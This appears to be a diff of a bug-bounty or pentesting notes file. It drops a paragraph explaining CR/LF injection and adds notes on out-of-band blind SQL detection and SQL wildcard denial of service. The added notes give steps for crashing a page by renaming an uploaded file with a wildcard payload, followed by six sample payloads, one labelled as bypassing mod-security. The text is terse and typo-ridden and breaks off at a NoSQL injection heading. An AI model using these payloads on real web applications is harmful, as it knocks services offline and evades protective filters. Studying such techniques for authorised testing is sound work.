+    Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL , this involves using burp collaborator or ooast 
 
-CR/LF (Carriage Return/Line Feed) injection is a type of security vulnerability. CR/LF refers to a sequence of two ASCII control characters: Carriage Return (CR, ASCII code 13) and Line Feed (LF, ASCII code 10). These characters are used in text files to signify the end of a line and control the positioning of the cursor or print head when displaying or printing text. CR/LF injection vulnerabilities occur when attackers insert CR/LF characters into input fields, file extensions or file uploads to manipulate application behavior. This can lead to exploits such as altering headers, injecting malicious code, or manipulating file content.
-                 
 
+
+
+
+
+
+       SQL-WILDCARD-DOS-   
+        
+       this is possible on every search fuction and also file upload features in wep app   
+                        https://shahjerry33.medium.com/sql-wildcard-dos-hang-till-death-adbae66d1f7b
+       SQL Wildcard DoS is about forcing the database to carry out CPU-intensive queries by using several wildcards
+       
+       
+       steps
+   go to     file upload feature
+   uploaded a normal text file with the name Test2.txt
+   intercepted the request and sent it to repeater for checking a normal response time
+    Then change the file name to SQL Wildcard DoS payload: %n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n]!%.txt and checked the response time
+    visited the page where the files were being uploaded and the page was not available
+    
+    
+    Sample Payloads
+
+1  ‘%_[^!_%/%a?F%_D)_(F%)_%([)({}%){()}£$&N%_)$*£()$*R”_)][%](%[x])%a][$*”£$-9]_%’
+2   ‘%64_[^!_%65/%aa?F%64_D)_(F%64)_%36([)({}%33){()}£$&N%55_)$*£()$*R”_)][%55](%66[x])%ba][$*”£$-9]_%54’ (bypasses mod-security)
+3    _[r/a)_ _(r/b)_ _(r-d)_
+4   %n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n]!%
+5     %_[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[! -z]@$!_%
+6    '%%%%'
 
 
        NOSQL INJECTION      NOSQL INJECTION       NOSQL INJECTION 
